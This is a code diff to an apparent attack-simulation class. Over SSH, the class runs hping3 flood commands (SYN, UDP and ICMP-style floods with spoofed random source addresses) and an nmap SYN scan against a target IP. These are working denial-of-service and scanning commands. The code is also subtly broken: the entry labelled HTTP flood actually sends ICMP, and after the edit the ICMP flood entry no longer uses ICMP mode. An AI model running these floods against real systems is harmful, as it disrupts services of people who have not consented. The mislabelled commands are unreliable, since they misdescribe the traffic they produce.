@@ -613,8 +613,8 @@ class AttackSimulator:
             ssh.connect(self.host, username=self.username, password=self.password, timeout=30)
 
             attack_command = {
+                'ICMPFlood': f'timeout 45 sudo hping3 --flood --rand-source {target_ip}',
                 'HTTPFlood': f'timeout 45 sudo hping3 -1 --flood --rand-source {target_ip}',
-                'ICMPFlood': f'timeout 45 sudo hping3 -1 --flood --rand-source {target_ip}',
                 'SYNFlood': f'timeout 45 sudo hping3 -S -p 80 --flood --rand-source {target_ip}',
                 'UDPFlood': f'timeout 45 sudo hping3 -2 --flood --rand-source -p 80 {target_ip}',
                 'SYNScan': f'timeout 45 sudo nmap -sS {target_ip} -p 1-1000 --max-rate 1000 -T4',
